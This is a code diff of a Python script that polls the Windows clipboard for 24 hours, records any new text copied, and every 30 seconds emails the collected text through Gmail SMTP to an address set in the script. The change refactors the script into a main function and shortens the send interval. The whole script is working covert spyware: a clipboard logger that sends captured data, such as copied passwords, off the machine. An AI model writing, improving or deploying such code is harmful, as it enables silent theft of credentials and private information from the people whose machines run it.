@@ -15,58 +15,78 @@ import time
 
 
 #Accound details for user email
-email = "YOUR_GMAIL_ADDRESS"
-password = "YOUR_GMAIL_PASSWORD"
+email = "YOUR GMAIL ACCOUNT"
+password = "YOUR GMAIL PASSWORD"
 port = 465
 
 #ttl = time to live, how long the program will run for in seconds(24hrs)
 ttl = 86400#time to live, to be changed
 
+# =============================================================================
 #function to send clipboard data to a defined email address via smtp
 def sendClipboard(email,password,message,port):
     context = ssl.create_default_context()
     with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
         server.login(email, password)
         server.sendmail(email, email, message)
+# =============================================================================
+        
 
+# =============================================================================
 #the clipboard data sent via email must be in ascii, this avoids crashes when 
 #the user copies an image, or other non text file
 def is_ascii(s):
     return all(ord(c) < 128 for c in s)
+# =============================================================================
 
+# =============================================================================
 #this function copies data from the clipboard to a variable c
 def clipboardCopy(c):
     try:
         win32clipboard.OpenClipboard()
         onBoard = win32clipboard.GetClipboardData()
+        #print if var is different
         if c != onBoard and is_ascii(onBoard) == True:
             c = onBoard
             print(c)
+        else: #empty variable if c is the same as before
+            c = ""
+            
         win32clipboard.CloseClipboard()
         time.sleep(1.5)
     except:
         win32clipboard.CloseClipboard()
         time.sleep(1.5)
     return c
+# =============================================================================
 
-#current is the current running string of copied data
-#message is the current string of all copied data which will be sent in the email
-message = ""
-currentData = ""
-lastData = ""
-
-#run while current time is less than the ttl
-start = time.time()
-while time.time() - start < ttl:
-    currentData = clipboardCopy(currentData)
-    message = message + "\n*****\n" + currentData
+# =============================================================================
+def main():
+    #current is the current running string of copied data
+    #message is the current string of all copied data to be sent in the email
+    message = ""
+    currentData = ""
+    lastData = ""
     
-#if current time is equal to deicced time in seconds send email(5 minutes)
-#
-    if (round((time.time() - start)) % 300 == 0) and (lastData != currentData): 
-        sendClipboard(email,password,message,port)
-        lastData = currentData
-        message = ""
-        
-#Send at the very end of life just in case
-sendClipboard(email,password,message,port)
+    #run while current time is less than the ttl
+    start = time.time()
+    while time.time() - start < ttl:
+        currentData = clipboardCopy(currentData)
+        if currentData != "": #add currentData to message stirng if non empty
+            message = message + "\n*****\n" + currentData
+        time_dif = round((time.time() - start))  
+        every = 30 #send email after 'every' seconds
+    #if current time is equal to deicced time in seconds send email(5 minutes)
+        if  time_dif % every == 0 and lastData != currentData: 
+            sendClipboard(email,password,message,port)
+            lastData = currentData
+            message = ""
+            
+    #Send at the very end of life just in case
+    sendClipboard(email,password,message,port)
+# =============================================================================
+
+
+if __name__ == "__main__":
+    #inform user and go to main method
+    main()
